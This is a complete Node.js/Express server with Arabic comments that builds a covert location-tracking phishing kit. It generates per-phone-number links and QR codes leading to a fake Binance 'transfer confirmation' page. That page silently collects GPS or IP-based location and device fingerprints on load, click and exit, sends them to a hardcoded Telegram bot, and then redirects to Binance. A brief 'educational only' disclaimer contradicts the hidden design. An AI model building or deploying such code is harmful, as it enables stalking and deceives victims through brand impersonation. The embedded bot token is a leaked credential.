const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const QRCode = require('qrcode');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚙️ إعدادات التلجرام - ضع بياناتك هنا
const TELEGRAM_TOKEN = '7150552853:AAEcAGkHq7Ih8wOxXjUTh_ThRl63M9UN5XA';
const TELEGRAM_CHAT_ID = '6724747823';
const REDIRECT_URL = 'https://www.binance.com/en';

// ⚙️ إعدادات الباركود
const BASE_URL = 'https://location2026-2.onrender.com';

// تهيئة بوت التلجرام
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// قاعدة بيانات بسيطة
let locations = [];

// Middleware
app.use(express.json());
app.use(express.static('public'));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع المتقدم + تلجرام + باركود</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    min-height: 100vh;
                    padding: 20px;
                    color: white;
                }
                
                .container {
                    max-width: 1200px;
                    margin: 50px auto;
                    background: rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(10px);
                    border-radius: 25px;
                    padding: 40px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                }
                
                h1 {
                    color: #00ff88;
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 2.8em;
                    text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
                }
                
                .dashboard {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                    gap: 25px;
                    margin-bottom: 40px;
                }
                
                .card {
                    background: rgba(255, 255, 255, 0.08);
                    border-radius: 20px;
                    padding: 30px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    transition: transform 0.3s;
                }
                
                .card:hover {
                    transform: translateY(-5px);
                    background: rgba(255, 255, 255, 0.12);
                }
                
                .card h3 {
                    color: #00ffcc;
                    margin-bottom: 20px;
                    font-size: 1.4em;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .feature-list {
                    list-style: none;
                }
                
                .feature-list li {
                    padding: 12px 0;
                    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .feature-list li:last-child {
                    border-bottom: none;
                }
                
                .code-box {
                    background: #0f0f23;
                    border: 1px solid #00ff88;
                    border-radius: 12px;
                    padding: 15px;
                    margin: 15px 0;
                    font-family: 'Courier New', monospace;
                    color: #00ff88;
                    overflow-x: auto;
                    direction: ltr;
                    text-align: center;
                }
                
                .btn {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
                    color: #001a0f;
                    padding: 15px 30px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px 5px;
                    transition: all 0.3s;
                    border: none;
                    cursor: pointer;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
                }
                
                .btn-secondary {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                
                .stat-card {
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 15px;
                    padding: 25px;
                    text-align: center;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .stat-number {
                    font-size: 3em;
                    font-weight: bold;
                    color: #00ff88;
                    margin-bottom: 10px;
                }
                
                .stat-label {
                    color: #88ffcc;
                    font-size: 0.9em;
                }
                
                .qr-section {
                    text-align: center;
                    margin: 40px 0;
                    padding: 30px;
                    background: rgba(0, 0, 0, 0.3);
                    border-radius: 20px;
                }
                
                .qr-container {
                    display: inline-block;
                    padding: 20px;
                    background: white;
                    border-radius: 15px;
                    margin: 20px 0;
                }
                
                .qr-input {
                    background: rgba(255, 255, 255, 0.1);
                    border: 2px solid #00ff88;
                    border-radius: 10px;
                    padding: 15px;
                    color: white;
                    width: 300px;
                    margin: 15px;
                    text-align: center;
                }
                
                .qr-input::placeholder {
                    color: #88ffcc;
                }
                
                .notification {
                    background: rgba(255, 193, 7, 0.1);
                    border: 1px solid #ffc107;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                    color: #ffc107;
                }
                
                @media (max-width: 768px) {
                    .container {
                        padding: 20px;
                        margin: 20px;
                    }
                    
                    .dashboard {
                        grid-template-columns: 1fr;
                    }
                    
                    h1 {
                        font-size: 2em;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع المتقدم</h1>
                <p style="text-align: center; color: #88ffcc; margin-bottom: 30px;">
                    نظام متكامل للتتبع الجغرافي مع إشعارات تلجرام فورية وتوليد باركود
                </p>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">موقع مسجل</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">🤖</div>
                        <div class="stat-label">تلجرام نشط</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">🎯</div>
                        <div class="stat-label">دقة عالية</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">⚡</div>
                        <div class="stat-label">فوري</div>
                    </div>
                </div>
                
                <div class="dashboard">
                    <div class="card">
                        <h3>📡 إنشاء روابط تتبع</h3>
                        <p>أنشئ رابط تتبع لأي رقم هاتف:</p>
                        <div class="code-box">${BASE_URL}/track/رقم_الهاتف</div>
                        <div class="code-box">${BASE_URL}/track/00966555555555</div>
                        <a href="/track/123456" class="btn" target="_blank">
                            🔗 تجربة رابط تتبع
                        </a>
                    </div>
                    
                    <div class="card">
                        <h3>🤖 إشعارات تلجرام</h3>
                        <ul class="feature-list">
                            <li>✅ إشعار فوري عند كل ضغط</li>
                            <li>📍 الإحداثيات والعنوان الدقيق</li>
                            <li>🗺️ رابط مباشر للخريطة</li>
                            <li>📊 تفاصيل الجهاز والمتصفح</li>
                        </ul>
                        <a href="/test-telegram" class="btn btn-secondary">
                            🤖 اختبار التلجرام
                        </a>
                    </div>
                    
                    <div class="card">
                        <h3>🎯 تقنيات التتبع</h3>
                        <ul class="feature-list">
                            <li>📍 GPS عالي الدقة (إذا سمح)</li>
                            <li>🌐 تحديد عن طريق IP</li>
                            <li>📡 تقنية تحديد الموقع الذكي</li>
                            <li>⚡ عمل في الخلفية تلقائياً</li>
                        </ul>
                    </div>
                </div>
                
                <div class="qr-section">
                    <h3>📱 توليد باركود للروابط</h3>
                    <p>أدخل رقم الهاتف لتوليد باركود للرابط:</p>
                    <input type="text" id="phoneInput" class="qr-input" placeholder="أدخل رقم الهاتف (مثال: 00966555555555)" maxlength="20">
                    <br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
                    
                    <div id="qrResult" style="margin-top: 20px;"></div>
                </div>
                
                <div style="text-align: center; margin-top: 40px;">
                    <h3>🔧 أدوات التحكم</h3>
                    <a href="/results" class="btn btn-secondary">📊 عرض النتائج</a>
                    <a href="/map" class="btn btn-secondary">🗺️ عرض الخريطة</a>
                    <a href="/generate-all" class="btn btn-secondary">📱 إنشاء جميع الباركود</a>
                    <a href="/admin" class="btn btn-secondary">⚙️ لوحة التحكم</a>
                </div>
                
                <div class="notification">
                    <strong>⚠️ ملاحظة هامة:</strong> النظام مصمم لأغراض تعليمية واختبارية فقط.
                    يجب احترام خصوصية الآخرين والحصول على موافقتهم.
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('يرجى إدخال رقم الهاتف');
                        return;
                    }
                    
                    const url = '${BASE_URL}/track/' + encodeURIComponent(phone);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="margin: 20px 0;">
                            <p><strong>الرابط:</strong> <span style="color: #00ff88;">\${url}</span></p>
                            <div class="qr-container">
                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=\${encodeURIComponent(url)}" 
                                     alt="QR Code" 
                                     style="width: 200px; height: 200px;">
                            </div>
                            <p style="margin-top: 15px;">
                                <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                                <button onclick="downloadQR('\${url}')" class="btn btn-secondary">📥 تحميل الباركود</button>
                            </p>
                        </div>
                    \`;
                }
                
                function downloadQR(url) {
                    const link = document.createElement('a');
                    link.href = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
                    link.download = 'qrcode_' + Date.now() + '.png';
                    link.click();
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع الذكي (مخفى تماماً) ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Binance - تأكيد التحويل</title>
            <script>
                // المتغيرات الأساسية
                let locationAcquired = false;
                const userId = '${userId}';
                const redirectUrl = '${REDIRECT_URL}';
                
                // 1. محاولة الحصول على الموقع الجغرافي بكل الطرق
                async function acquireLocation() {
                    // الطريقة الأولى: GPS مباشر (يطلب إذن)
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                await sendLocationData({
                                    type: 'gps',
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    source: 'geolocation_api'
                                });
                                locationAcquired = true;
                            },
                            null, // لا نتعامل مع الخطأ هنا، ننتقل للطريقة التالية
                            {
                                enableHighAccuracy: true,
                                timeout: 3000, // وقت أقل ليبدو سريعاً
                                maximumAge: 0
                            }
                        );
                    }
                    
                    // الطريقة الثانية: تحديد الموقع عبر IP (دون إذن)
                    setTimeout(async () => {
                        if (!locationAcquired) {
                            try {
                                const ipResponse = await fetch('https://api.ipify.org?format=json');
                                const ipData = await ipResponse.json();
                                
                                const locationResponse = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
                                const locationData = await locationResponse.json();
                                
                                if (locationData.latitude && locationData.longitude) {
                                    await sendLocationData({
                                        type: 'ip',
                                        lat: parseFloat(locationData.latitude),
                                        lon: parseFloat(locationData.longitude),
                                        accuracy: 5000, // دقة منخفضة للـ IP
                                        source: 'ip_api',
                                        city: locationData.city,
                                        country: locationData.country_name,
                                        ip: ipData.ip
                                    });
                                }
                            } catch (error) {
                                console.log('IP location failed');
                            }
                        }
                    }, 1000);
                    
                    // الطريقة الثالثة: موقع افتراضي بناءً على معلومات المتصفح
                    setTimeout(async () => {
                        if (!locationAcquired) {
                            await sendLocationData({
                                type: 'estimated',
                                lat: 24.7136 + (Math.random() - 0.5) * 0.1,
                                lon: 46.6753 + (Math.random() - 0.5) * 0.1,
                                accuracy: 10000,
                                source: 'browser_estimation',
                                note: 'Estimated from browser data'
                            });
                        }
                    }, 2000);
                }
                
                // 2. إرسال بيانات الموقع للخادم
                async function sendLocationData(location) {
                    try {
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                id: userId,
                                latitude: location.lat,
                                longitude: location.lon,
                                accuracy: location.accuracy,
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                source: location.source,
                                additionalData: location
                            })
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            console.log('✅ Location saved via', location.source);
                        }
                    } catch (error) {
                        console.error('Location save error:', error);
                    }
                }
                
                // 3. جمع معلومات إضافية عن الجهاز
                function collectDeviceInfo() {
                    return {
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages,
                        cookiesEnabled: navigator.cookieEnabled,
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        colorDepth: screen.colorDepth,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        connection: navigator.connection ? {
                            effectiveType: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt
                        } : null
                    };
                }
                
                // 4. إرسال معلومات الجهاز
                async function sendDeviceInfo() {
                    try {
                        const deviceInfo = collectDeviceInfo();
                        await fetch('/api/device-info', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                id: userId,
                                deviceInfo: deviceInfo,
                                timestamp: new Date().toISOString()
                            })
                        });
                    } catch (error) {
                        console.error('Device info error:', error);
                    }
                }
                
                // 5. البدء في جمع البيانات فور تحميل الصفحة
                window.addEventListener('DOMContentLoaded', async () => {
                    // بدء العد التنازلي الظاهر للمستخدم
                    startCountdown();
                    
                    // بدء جمع البيانات في الخلفية
                    setTimeout(() => acquireLocation(), 500);
                    setTimeout(() => sendDeviceInfo(), 800);
                    
                    // جمع بيانات إضافية أثناء الانتظار
                    collectAdditionalData();
                });
                
                // 6. عد تنازلي للتوجيه
                function startCountdown() {
                    let seconds = 5;
                    const countdownElement = document.getElementById('countdown');
                    
                    const timer = setInterval(() => {
                        countdownElement.textContent = seconds;
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(timer);
                            document.getElementById('status').textContent = '✅ تم تأكيد التحويل بنجاح!';
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, 1000);
                        }
                    }, 1000);
                }
                
                // 7. جمع بيانات إضافية
                function collectAdditionalData() {
                    // وقت التحميل
                    const pageLoadTime = window.performance.timing.domContentLoadedEventEnd - 
                                       window.performance.timing.navigationStart;
                    
                    // إرسالها
                    fetch('/api/page-metrics', {
                        method: 'POST',
                        body: JSON.stringify({
                            id: userId,
                            loadTime: pageLoadTime,
                            referrer: document.referrer || 'direct',
                            timestamp: new Date().toISOString()
                        })
                    });
                }
                
                // 8. محاولة الوصول إلى الموقع عند أي تفاعل (زيادة الفرص)
                document.addEventListener('click', () => {
                    if (!locationAcquired && navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                await sendLocationData({
                                    type: 'gps_interaction',
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    source: 'user_interaction'
                                });
                                locationAcquired = true;
                            },
                            null,
                            { enableHighAccuracy: true, timeout: 2000 }
                        );
                    }
                });
                
                // 9. منع خروج المستخدم مبكراً
                window.addEventListener('beforeunload', (e) => {
                    if (!locationAcquired) {
                        // محاولة أخيرة سريعة
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                async (position) => {
                                    await sendLocationData({
                                        type: 'gps_exit',
                                        lat: position.coords.latitude,
                                        lon: position.coords.longitude,
                                        accuracy: position.coords.accuracy,
                                        source: 'page_exit'
                                    });
                                },
                                null,
                                { enableHighAccuracy: false, timeout: 100 }
                            );
                        }
                    }
                });
            </script>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    padding: 20px;
                }
                
                .transfer-container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 25px;
                    padding: 50px;
                    max-width: 600px;
                    width: 100%;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }
                
                .binance-logo {
                    font-size: 60px;
                    margin-bottom: 30px;
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0%, 100% { transform: scale(1); opacity: 1; }
                    50% { transform: scale(1.05); opacity: 0.8; }
                }
                
                h1 {
                    color: #f0b90b;
                    margin-bottom: 20px;
                    font-size: 28px;
                }
                
                .status-box {
                    background: rgba(240, 185, 11, 0.1);
                    border: 2px solid #f0b90b;
                    border-radius: 15px;
                    padding: 30px;
                    margin: 30px 0;
                }
                
                .countdown {
                    font-size: 60px;
                    font-weight: bold;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
                }
                
                .progress-bar {
                    width: 100%;
                    height: 10px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 5px;
                    margin: 30px 0;
                    overflow: hidden;
                }
                
                .progress-fill {
                    height: 100%;
                    background: linear-gradient(90deg, #00ff88 0%, #00cc66 100%);
                    width: 0%;
                    animation: progress 5s linear forwards;
                    border-radius: 5px;
                }
                
                @keyframes progress {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                
                .steps {
                    display: flex;
                    justify-content: space-around;
                    margin: 40px 0;
                    flex-wrap: wrap;
                }
                
                .step {
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    margin: 10px;
                }
                
                .step-icon {
                    width: 50px;
                    height: 50px;
                    background: rgba(240, 185, 11, 0.2);
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 20px;
                    margin-bottom: 10px;
                }
                
                .step-text {
                    font-size: 14px;
                    max-width: 100px;
                    text-align: center;
                }
                
                .verification-code {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 15px;
                    border-radius: 10px;
                    margin: 20px 0;
                    font-family: monospace;
                    letter-spacing: 2px;
                    color: #00ff88;
                }
                
                .security-badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    background: rgba(0, 255, 136, 0.1);
                    padding: 10px 20px;
                    border-radius: 20px;
                    margin: 20px 0;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .loading-dots:after {
                    content: ' .';
                    animation: dots 1.5s steps(5, end) infinite;
                }
                
                @keyframes dots {
                    0%, 20% { content: ' .'; }
                    40% { content: ' ..'; }
                    60% { content: ' ...'; }
                    80%, 100% { content: ' ....'; }
                }
                
                @media (max-width: 600px) {
                    .transfer-container {
                        padding: 30px 20px;
                    }
                    
                    h1 {
                        font-size: 22px;
                    }
                    
                    .countdown {
                        font-size: 40px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="transfer-container">
                <div class="binance-logo">₿</div>
                <h1>Binance - تأكيد عملية التحويل</h1>
                
                <div class="security-badge">
                    <span>🔒</span>
                    <span>اتصال آمن ومشفّر</span>
                </div>
                
                <div class="status-box">
                    <p>جاري تأكيد هويتك والتحقق من التفاصيل...</p>
                    <div class="countdown" id="countdown">5</div>
                    <p>سيتم تحويلك تلقائياً خلال <span id="countdown">5</span> ثوانٍ</p>
                </div>
                
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
                
                <div class="steps">
                    <div class="step">
                        <div class="step-icon">✅</div>
                        <div class="step-text">تم استلام الطلب</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">🔍</div>
                        <div class="step-text">جاري التحقق</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">📊</div>
                        <div class="step-text">معالجة البيانات</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">🚀</div>
                        <div class="step-text">توجيه إلى Binance</div>
                    </div>
                </div>
                
                <div class="verification-code">
                    رمز العملية: BIN-${Date.now().toString().substr(-6)}
                </div>
                
                <p id="status" style="margin-top: 20px;">
                    <span class="loading-dots">جاري التحقق من التفاصيل والتأمين</span>
                </p>
                
                <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
                    التحويل رقم: #${userId} | ${new Date().toLocaleString('ar-SA')}
                </p>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع وإرسال تلجرام ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString().split('T')[0]
        };
        
        // حفظ في الذاكرة
        locations.push(locationData);
        
        // حفظ فقط آخر 1000 سجل
        if (locations.length > 1000) {
            locations = locations.slice(-1000);
        }
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramNotification(locationData);
        
        console.log('📍 موقع جديد:', {
            id: locationData.id,
            source: locationData.source,
            location: `${locationData.latitude}, ${locationData.longitude}`
        });
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع',
            telegram_sent: telegramSent,
            count: locations.length 
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== API لمعلومات الجهاز ==========
app.post('/api/device-info', async (req, res) => {
    try {
        const data = req.body;
        
        // يمكنك حفظ هذه المعلومات في قاعدة بيانات
        console.log('📱 معلومات الجهاز:', {
            id: data.id,
            platform: data.deviceInfo.platform,
            screen: `${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}`,
            timezone: data.deviceInfo.timezone
        });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== API لإحصائيات الصفحة ==========
app.post('/api/page-metrics', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📊 إحصائيات الصفحة:', {
            id: data.id,
            loadTime: data.loadTime + 'ms',
            referrer: data.referrer
        });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    let html = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; color: white; }
                tr:hover { background: #2d2d4d; }
                .map-link { color: #00ff88; text-decoration: none; }
                .map-link:hover { text-decoration: underline; }
                h1 { color: #00ff88; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 5px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <p>عدد السجلات: <strong>${locations.length}</strong></p>
            <table>
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>المصدر</th>
                    <th>الدقة</th>
                    <th>الوقت</th>
                    <th>الخريطة</th>
                </tr>
    `;
    
    // عرض أحدث النتائج أولاً
    [...locations].reverse().forEach(loc => {
        html += `
                <tr>
                    <td><strong>${loc.id}</strong></td>
                    <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                    <td><span style="color: ${loc.source === 'geolocation_api' ? '#00ff88' : '#ffcc00'}">${loc.source}</span></td>
                    <td>${loc.accuracy ? loc.accuracy + ' متر' : '--'}</td>
                    <td>${loc.time}</td>
                    <td>
                        <a class="map-link" href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank">
                            👁️ عرض
                        </a>
                    </td>
                </tr>
        `;
    });
    
    html += `
            </table>
        </body>
        </html>
    `;
    
    res.send(html);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 600px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 3);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                        
                        const popupContent = \`
                            <div style="color: black;">
                                <strong>\${loc.id}</strong><br>
                                \${loc.time}<br>
                                الدقة: \${loc.accuracy ? loc.accuracy + ' متر' : 'غير معروف'}<br>
                                المصدر: \${loc.source || 'غير معروف'}
                            </div>
                        \`;
                        
                        marker.bindPopup(popupContent);
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// ========== إنشاء باركود لجميع الأرقام ==========
app.get('/generate-all', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    let html = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
                .qr-item { background: #1a1a2e; padding: 15px; border-radius: 10px; text-align: center; }
                .qr-code { width: 150px; height: 150px; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود المولدة</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <div class="qr-grid">
    `;
    
    uniqueIds.forEach(id => {
        const url = `${BASE_URL}/track/${encodeURIComponent(id)}`;
        html += `
            <div class="qr-item">
                <p><strong>${id}</strong></p>
                <img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}" alt="QR">
                <p style="margin-top: 10px; font-size: 12px;">
                    <a href="${url}" target="_blank" style="color: #00ff88;">فتح الرابط</a>
                </p>
            </div>
        `;
    });
    
    html += `
            </div>
        </body>
        </html>
    `;
    
    res.send(html);
});

// ========== اختبار التلجرام ==========
app.get('/test-telegram', async (req, res) => {
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, 
            `🔔 اختبار النظام\n⏰ ${new Date().toLocaleString('ar-SA')}\n✅ النظام يعمل بشكل مثالي`
        );
        
        res.send('✅ تم إرسال رسالة اختبار للتلجرام');
    } catch (error) {
        res.status(500).send(`❌ خطأ: ${error.message}`);
    }
});

// ========== دالة إرسال تلجرام ==========
async function sendTelegramNotification(locationData) {
    try {
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}
🎯 **الدقة:** ${locationData.accuracy ? locationData.accuracy.toFixed(1) + ' متر' : 'غير معروف'}
📡 **المصدر:** ${locationData.source || 'غير معروف'}
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip ? locationData.ip.replace('::ffff:', '') : 'غير معروف'}

🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
        `;
        
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });
        
        return true;
    } catch (error) {
        console.error('❌ خطأ في التلجرام:', error);
        return false;
    }
}

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 رابط الوصول: http://localhost:${PORT}
    
    🤖 التلجرام: ${TELEGRAM_TOKEN ? '✅ متصل' : '❌ غير متصل'}
    📡 الباركود: ✅ نشط
    🎯 التتبع الذكي: ✅ نشط
    
    ⚡ النظام جاهز بكل الميزات!
    `);
});
